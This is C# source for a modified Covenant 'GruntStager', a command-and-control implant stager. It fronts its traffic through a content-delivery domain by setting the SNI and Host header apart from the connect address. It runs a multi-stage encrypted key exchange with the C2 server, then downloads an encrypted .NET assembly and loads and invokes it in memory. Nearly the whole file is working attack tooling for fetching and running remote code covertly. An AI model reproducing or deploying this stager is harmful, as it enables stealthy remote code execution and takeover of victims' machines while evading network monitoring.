using System;
using System.Net;
using System.Net.Sockets;
using System.Net.Security;
using System.Linq;
using System.Text;
using System.Text.RegularExpressions;
using System.Reflection;
using System.Collections.Generic;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.IO;
using System.Security.Authentication;

namespace GruntStager
{
    public class HttpsClient
    {
        private string ip;
        private int port;
        private string sni;
        private Dictionary<string, string> defaultHeaders;
        private bool UseCertPinning;
        private bool ValidateCert;
        private string CovenantCertHash;

        public HttpsClient(string addr, int port, string sni, bool ValidateCert = false, bool UseCertPinning = false, string CovenantCertHash = "")
        {
            this.ip = doDNS(addr);
            this.port = port;
            this.sni = sni;
            this.defaultHeaders = new Dictionary<string, string>()
            {
                { "Host", sni },                // by default, Host == SNI
                { "Accept", "*/*" },
                { "Accept-Language", "en" },
                { "Connection", "close" },
            };
            this.UseCertPinning = UseCertPinning;
            this.ValidateCert = ValidateCert;
            this.CovenantCertHash = CovenantCertHash;
        }

        private string doDNS(string addr)
        {
            IPAddress ip;
            if (IPAddress.TryParse(addr, out ip))
            {
                return ip.ToString();
            }
            else
            {
                IPAddress[] ipAddrs = Dns.GetHostEntry(addr).AddressList;
                Random rand = new Random();
                return ipAddrs[rand.Next(ipAddrs.Length)].ToString();
            }
        }

        private SslStream initSsl()
        {
            X509Certificate2 ourCA = new X509Certificate2();
            RemoteCertificateValidationCallback callback = (sender, cert, chain, errors) =>
            {
                bool valid = true;
                if (UseCertPinning && CovenantCertHash != "")
                {
                    valid = cert.GetCertHashString() == CovenantCertHash;
                }
                if (valid && ValidateCert)
                {
                    valid = errors == SslPolicyErrors.None;
                }
                return valid;
            };
            try
            {
                TcpClient client = new TcpClient(ip, port);
                SslStream sslStream = new SslStream(client.GetStream(), false, callback, null);
                // ref: https://github.com/cobbr/Covenant/pull/238/files
                sslStream.AuthenticateAsClient(sni, null, SslProtocols.Ssl3 | SslProtocols.Tls | (SslProtocols)768 | (SslProtocols)3072 | (SslProtocols)12288, true);
                return sslStream;
            }
            catch (Exception e)
            {
                Console.Error.WriteLine(e.Message + Environment.NewLine + e.StackTrace);
                return null;
            }
        }

        private string readLine(SslStream sslStream)
        {
            using (var ms = new MemoryStream())
            {
                while (true)
                {
                    byte chr = (byte)sslStream.ReadByte();
                    if (chr == 13) // \r
                    {
                        sslStream.ReadByte(); // \n
                        break;
                    }
                    ms.WriteByte(chr);
                }
                return Encoding.UTF8.GetString(ms.ToArray());
            }
        }

        private byte[] readFull(SslStream sslStream, int length)
        {
            using (var ms = new MemoryStream())
            {
                while (length > 0)
                {
                    byte[] buffer = new byte[length];
                    int readLen = sslStream.Read(buffer, 0, buffer.Length);
                    ms.Write(buffer, 0, readLen);
                    length -= readLen;
                }
                return ms.ToArray();
            }
        }

        private string readResponse(SslStream sslStream)
        {
            Console.WriteLine("\n\n=============================== HTTP RSP ===============================");
            bool chunked = false;
            int contentLength = -1;

            using (var ms = new MemoryStream())
            {
                while (true)
                {
                    string line = readLine(sslStream);
                    Console.WriteLine(line);
                    if (line.ToLower().StartsWith("transfer-encoding") && line.ToLower().Contains("chunked"))
                    {
                        chunked = true;
                    }
                    if (line.ToLower().StartsWith("content-length"))
                    {
                        string val = line.Substring(line.IndexOf(":") + 1);
                        contentLength = int.Parse(val);
                    }
                    if (line.Equals("")) break;
                }

                if (chunked)
                {
                    while (true)
                    {
                        string chunkLenStr = readLine(sslStream);
                        Console.WriteLine(chunkLenStr);
                        int chunkLen = int.Parse(chunkLenStr, System.Globalization.NumberStyles.HexNumber);
                        if (chunkLen == 0) break;
                        byte[] buffer = readFull(sslStream, chunkLen);
                        Console.WriteLine(Encoding.UTF8.GetString(buffer).TrimEnd('\0'));
                        ms.Write(buffer, 0, buffer.Length);
                        readLine(sslStream);
                    }
                }
                else
                {
                    if (contentLength > 0)
                    {
                        byte[] buffer = readFull(sslStream, contentLength);
                        Console.WriteLine(Encoding.UTF8.GetString(buffer));
                        ms.Write(buffer, 0, buffer.Length);
                    }
                    else if (contentLength < 0)
                    {
                        byte[] buffer = new byte[10240];
                        while (true)
                        {
                            int len = sslStream.Read(buffer, 0, buffer.Length);
                            if (len > 0)
                            {
                                Console.WriteLine(Encoding.UTF8.GetString(buffer).TrimEnd('\0'));
                                ms.Write(buffer, 0, len);
                            }
                            else
                            {
                                break;
                            }
                        }
                    }
                }
                Console.WriteLine("\n\n");
                return Encoding.UTF8.GetString(ms.ToArray());
            }
        }

        private string buildHeaders(string method, Dictionary<string, string> headers, int dataLength = 0)
        {
            Dictionary<string, string> httpHeaders = new Dictionary<string, string>();
            if (headers != null)
            {
                foreach (string key in headers.Keys)
                {
                    httpHeaders[key] = headers[key];
                }
            }
            foreach (string key in defaultHeaders.Keys)
            {
                if (!httpHeaders.ContainsKey(key))
                {
                    httpHeaders[key] = defaultHeaders[key];
                }
            }
            if (method == "POST")
            {
                if (!httpHeaders.ContainsKey("Content-Type"))
                {
                    httpHeaders["Content-Type"] = "application/x-www-form-urlencoded";
                }
                httpHeaders["Content-Length"] = $@"{dataLength}";
            }
            string httpHeadersStr = "";
            foreach (string key in httpHeaders.Keys)
            {
                httpHeadersStr += $@"{key}: {httpHeaders[key]}" + "\r\n";
            }
            httpHeadersStr += "\r\n";
            return httpHeadersStr;
        }

        private string send(SslStream sslStream, string httpRequest)
        {
            Console.WriteLine("\n\n=============================== HTTP REQ ===============================");
            Console.WriteLine(httpRequest);
            Console.WriteLine("\n\n");
            sslStream.Write(Encoding.UTF8.GetBytes(httpRequest));
            sslStream.Flush();
            string rawResponse = readResponse(sslStream);
            sslStream.Close();
            return rawResponse;
        }

        public string Get(string path, Dictionary<string, string> headers = null)
        {
            var sslStream = initSsl();
            if (sslStream is null) return null;
            string method = "GET";
            string httpGetRequest = $@"{method} {path} HTTP/1.1" + "\r\n";
            httpGetRequest += buildHeaders(method, headers);
            return send(sslStream, httpGetRequest);
        }

        public string Post(string path, string data, Dictionary<string, string> headers = null)
        {
            var sslStream = initSsl();
            if (sslStream is null) return null;
            string method = "POST";
            string httpPostRequest = $@"{method} {path} HTTP/1.1" + "\r\n";
            httpPostRequest += buildHeaders(method, headers, data.Length);
            httpPostRequest += data;
            return send(sslStream, httpPostRequest);
        }
    }


    public class GruntStager
    {
        public GruntStager()
        {
            ExecuteStager();
        }
        [STAThread]
        public static void Main(string[] args)
        {
            new GruntStager();
        }
        public static void Execute()
        {
            new GruntStager();
        }
        public void ExecuteStager()
        {
            try
            {
                // ---------------------- configuration ----------------------
                string Addr = "staging.fontawesome.com"; // IP or Domain Name
                int Port = 443;
                string SNI = "img.fontawesome.com";
                // -----------------------------------------------------------

                string CovenantCertHash = @"{{REPLACE_COVENANT_CERT_HASH}}";
                List<string> ProfileHttpHeaderNames = @"{{REPLACE_PROFILE_HTTP_HEADER_NAMES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
                List<string> ProfileHttpHeaderValues = @"{{REPLACE_PROFILE_HTTP_HEADER_VALUES}}".Split(',').ToList().Select(H => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(H))).ToList();
                List<string> ProfileHttpUrls = @"{{REPLACE_PROFILE_HTTP_URLS}}".Split(',').ToList().Select(U => System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(U))).ToList();
                string ProfileHttpPostRequest = @"{{REPLACE_PROFILE_HTTP_POST_REQUEST}}".Replace(Environment.NewLine, "\n");
                string ProfileHttpPostResponse = @"{{REPLACE_PROFILE_HTTP_POST_RESPONSE}}".Replace(Environment.NewLine, "\n");
                bool ValidateCert = bool.Parse(@"{{REPLACE_VALIDATE_CERT}}");
                bool UseCertPinning = bool.Parse(@"false");

                Random random = new Random();
                string aGUID = @"{{REPLACE_GRUNT_GUID}}";
                string GUID = Guid.NewGuid().ToString().Replace("-", "").Substring(0, 10);
                byte[] SetupKeyBytes = Convert.FromBase64String(@"{{REPLACE_GRUNT_SHARED_SECRET_PASSWORD}}");
                string MessageFormat = @"{{""GUID"":""{0}"",""Type"":{1},""Meta"":""{2}"",""IV"":""{3}"",""EncryptedMessage"":""{4}"",""HMAC"":""{5}""}}";

                Aes SetupAESKey = Aes.Create();
                SetupAESKey.Mode = CipherMode.CBC;
                SetupAESKey.Padding = PaddingMode.PKCS7;
                SetupAESKey.Key = SetupKeyBytes;
                SetupAESKey.GenerateIV();
                HMACSHA256 hmac = new HMACSHA256(SetupKeyBytes);
                RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(2048, new CspParameters());

                byte[] RSAPublicKeyBytes = Encoding.UTF8.GetBytes(rsa.ToXmlString(false));
                byte[] EncryptedRSAPublicKey = SetupAESKey.CreateEncryptor().TransformFinalBlock(RSAPublicKeyBytes, 0, RSAPublicKeyBytes.Length);
                byte[] hash = hmac.ComputeHash(EncryptedRSAPublicKey);
                string Stage0Body = String.Format(MessageFormat, aGUID + GUID, "0", "", Convert.ToBase64String(SetupAESKey.IV), Convert.ToBase64String(EncryptedRSAPublicKey), Convert.ToBase64String(hash));

                string transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(Stage0Body));
                string Stage0Response = "";
                var wc = new HttpsClient(Addr, Port, SNI, ValidateCert, UseCertPinning, CovenantCertHash);
                Dictionary<string, string> headers = new Dictionary<string, string>();
                for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)
                {
                    headers[ProfileHttpHeaderNames[i].Replace("{GUID}", "")] = ProfileHttpHeaderValues[i].Replace("{GUID}", "");
                }
                wc.Get(ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", ""), headers);
                for (int i = 0; i < ProfileHttpHeaderValues.Count; i++)
                {
                    headers[ProfileHttpHeaderNames[i].Replace("{GUID}", GUID)] = ProfileHttpHeaderValues[i].Replace("{GUID}", GUID);
                }
                Stage0Response = wc.Post(ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", GUID), String.Format(ProfileHttpPostRequest, transformedResponse), headers);
                string extracted = Parse(Stage0Response, ProfileHttpPostResponse)[0];
                extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                List<string> parsed = Parse(extracted, MessageFormat);
                string iv64str = parsed[3];
                string message64str = parsed[4];
                string hash64str = parsed[5];
                byte[] messageBytes = Convert.FromBase64String(message64str);
                if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messageBytes))) { return; }
                SetupAESKey.IV = Convert.FromBase64String(iv64str);
                byte[] PartiallyDecrypted = SetupAESKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);
                byte[] FullyDecrypted = rsa.Decrypt(PartiallyDecrypted, true);

                Aes SessionKey = Aes.Create();
                SessionKey.Mode = CipherMode.CBC;
                SessionKey.Padding = PaddingMode.PKCS7;
                SessionKey.Key = FullyDecrypted;
                SessionKey.GenerateIV();
                hmac = new HMACSHA256(SessionKey.Key);
                byte[] challenge1 = new byte[4];
                RandomNumberGenerator rng = RandomNumberGenerator.Create();
                rng.GetBytes(challenge1);
                byte[] EncryptedChallenge1 = SessionKey.CreateEncryptor().TransformFinalBlock(challenge1, 0, challenge1.Length);
                hash = hmac.ComputeHash(EncryptedChallenge1);

                string Stage1Body = String.Format(MessageFormat, GUID, "1", "", Convert.ToBase64String(SessionKey.IV), Convert.ToBase64String(EncryptedChallenge1), Convert.ToBase64String(hash));
                transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(Stage1Body));

                string Stage1Response = "";
                Stage1Response = wc.Post(ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", GUID), String.Format(ProfileHttpPostRequest, transformedResponse), headers);
                extracted = Parse(Stage1Response, ProfileHttpPostResponse)[0];
                extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                parsed = Parse(extracted, MessageFormat);
                iv64str = parsed[3];
                message64str = parsed[4];
                hash64str = parsed[5];
                messageBytes = Convert.FromBase64String(message64str);
                if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messageBytes))) { return; }
                SessionKey.IV = Convert.FromBase64String(iv64str);

                byte[] DecryptedChallenges = SessionKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);
                byte[] challenge1Test = new byte[4];
                byte[] challenge2 = new byte[4];
                Buffer.BlockCopy(DecryptedChallenges, 0, challenge1Test, 0, 4);
                Buffer.BlockCopy(DecryptedChallenges, 4, challenge2, 0, 4);
                if (Convert.ToBase64String(challenge1) != Convert.ToBase64String(challenge1Test)) { return; }

                SessionKey.GenerateIV();
                byte[] EncryptedChallenge2 = SessionKey.CreateEncryptor().TransformFinalBlock(challenge2, 0, challenge2.Length);
                hash = hmac.ComputeHash(EncryptedChallenge2);

                string Stage2Body = String.Format(MessageFormat, GUID, "2", "", Convert.ToBase64String(SessionKey.IV), Convert.ToBase64String(EncryptedChallenge2), Convert.ToBase64String(hash));
                transformedResponse = MessageTransform.Transform(Encoding.UTF8.GetBytes(Stage2Body));

                string Stage2Response = "";
                Stage2Response = wc.Post(ProfileHttpUrls[random.Next(ProfileHttpUrls.Count)].Replace("{GUID}", GUID), String.Format(ProfileHttpPostRequest, transformedResponse), headers);
                extracted = Parse(Stage2Response, ProfileHttpPostResponse)[0];
                extracted = Encoding.UTF8.GetString(MessageTransform.Invert(extracted));
                parsed = Parse(extracted, MessageFormat);
                iv64str = parsed[3];
                message64str = parsed[4];
                hash64str = parsed[5];
                messageBytes = Convert.FromBase64String(message64str);
                if (hash64str != Convert.ToBase64String(hmac.ComputeHash(messageBytes))) { return; }
                SessionKey.IV = Convert.FromBase64String(iv64str);
                byte[] DecryptedAssembly = SessionKey.CreateDecryptor().TransformFinalBlock(messageBytes, 0, messageBytes.Length);
                Assembly gruntAssembly = Assembly.Load(DecryptedAssembly);
                gruntAssembly.GetTypes()[1].GetMethods()[0].Invoke(null, new Object[] { Addr, Port, SNI, CovenantCertHash, GUID, SessionKey }); // Grunt.Execute
            }
            catch (Exception e) { Console.Error.WriteLine(e.Message + Environment.NewLine + e.StackTrace); }
        }

        public static List<string> Parse(string data, string format)
        {
            format = Regex.Escape(format).Replace("\\{", "{").Replace("{{", "{").Replace("}}", "}");
            if (format.Contains("{0}")) { format = format.Replace("{0}", "(?'group0'.*)"); }
            if (format.Contains("{1}")) { format = format.Replace("{1}", "(?'group1'.*)"); }
            if (format.Contains("{2}")) { format = format.Replace("{2}", "(?'group2'.*)"); }
            if (format.Contains("{3}")) { format = format.Replace("{3}", "(?'group3'.*)"); }
            if (format.Contains("{4}")) { format = format.Replace("{4}", "(?'group4'.*)"); }
            if (format.Contains("{5}")) { format = format.Replace("{5}", "(?'group5'.*)"); }
            Match match = new Regex(format).Match(data);
            List<string> matches = new List<string>();
            if (match.Groups["group0"] != null) { matches.Add(match.Groups["group0"].Value); }
            if (match.Groups["group1"] != null) { matches.Add(match.Groups["group1"].Value); }
            if (match.Groups["group2"] != null) { matches.Add(match.Groups["group2"].Value); }
            if (match.Groups["group3"] != null) { matches.Add(match.Groups["group3"].Value); }
            if (match.Groups["group4"] != null) { matches.Add(match.Groups["group4"].Value); }
            if (match.Groups["group5"] != null) { matches.Add(match.Groups["group5"].Value); }
            return matches;
        }

        // {{REPLACE_PROFILE_MESSAGE_TRANSFORM}}
    }
}